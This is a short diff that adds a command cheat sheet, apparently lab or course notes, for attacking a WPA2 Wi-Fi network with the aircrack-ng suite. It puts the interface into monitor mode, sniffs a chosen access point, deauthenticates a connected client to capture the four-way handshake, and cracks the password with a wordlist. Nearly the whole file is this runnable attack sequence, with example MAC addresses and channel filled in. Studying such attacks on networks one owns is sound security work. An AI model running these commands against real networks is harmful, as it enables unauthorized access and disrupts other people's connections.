@@ -1,0 +1,28 @@
+##########################
+## Commands - Capturing the Handshake and Cracking the WPA2 Password
+##########################
+
+
+# 1. Put the WiFi interface into monitor mode
+iwconfig # -> check the interface name
+airmon-ng check kill
+airmon-ng start wlan0
+
+# 2. Identify the network to attack and a connected client
+airodump-ng -i wlan0mon 
+airodump-ng -i wlan0mon --bssid 34:2C:C4:93:45:97 -c 1 # -> narrow down the result
+
+# For this example the AP MAC (--bssid) is 34:2C:C4:93:45:97, operation channel is 1
+# and the client to deauthenticate is b4:c4:fc:67:57:08 
+
+# 3. Sniffing WiFi traffic of the network to attack and saving it to a file
+airodump-ng -i wlan0mon --bssid 34:2C:C4:93:45:97 -c 1 -w wpa2crack
+
+
+# 4. Deauthenticating the client 
+aireplay-ng --deauth 3 -a 34:2C:C4:93:45:97 -c b4:c4:fc:67:57:08 wlan0mon
+
+# at this moment the wpa2 4-way handshake  was captured
+
+# 5. Cracking the encrypted password using a wordlist
+aircrack-ng wpa2crack* -w /usr/share/dict/words
